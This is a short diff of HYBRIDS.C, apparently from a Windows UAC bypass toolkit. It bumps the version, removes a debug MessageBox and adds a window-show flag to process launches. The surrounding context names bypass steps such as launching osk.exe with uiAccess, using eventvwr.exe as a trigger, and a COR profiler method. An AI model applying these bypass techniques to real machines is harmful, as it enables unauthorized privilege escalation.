@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.16
+*  VERSION:     3.17
 *
-*  DATE:        11 Mar 2019
+*  DATE:        16 Mar 2019
 *
 *  Hybrid UAC bypass methods.
 *
@@ -41,8 +41,6 @@ BOOL ucmMethodCleanupSingleItemSystem32(
 
     _strcpy(szBuffer, g_ctx->szSystemDirectory);
     _strcat(szBuffer, lpItemName);
-
-    MessageBox(0, szBuffer, NULL, 0);
 
     bResult = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
     if (bResult) {
@@ -1696,14 +1694,14 @@ BOOL ucmUiAccessMethod(
         // Run uiAccess osk.exe from Program Files.
         //
         _strcat(szTarget, OSK_EXE);
-        if (supRunProcess2(szTarget, NULL, NULL, FALSE)) {
+        if (supRunProcess2(szTarget, NULL, NULL, SW_SHOW, FALSE)) {
             //
             // Run eventvwr.exe as final trigger.
             // Spawns mmc.exe with eventvwr.msc snap-in.
             //
             _strcpy(szTarget, g_ctx->szSystemDirectory);
             _strcat(szTarget, EVENTVWR_EXE);
-            bResult = supRunProcess2(szTarget, NULL, NULL, FALSE);
+            bResult = supRunProcess2(szTarget, NULL, NULL, SW_SHOW, FALSE);
         }
 
     } while (bCond);
@@ -2202,7 +2200,7 @@ BOOL ucmCorProfilerMethod(
         //
         // Load target app and trigger cor profiler, eventvwr snap-in is written in the dotnet.
         //
-        bResult = supRunProcess2(MMC_EXE, EVENTVWR_MSC, NULL, FALSE);
+        bResult = supRunProcess2(MMC_EXE, EVENTVWR_MSC, NULL, SW_SHOW, FALSE);
 
     } while (bCond);
 
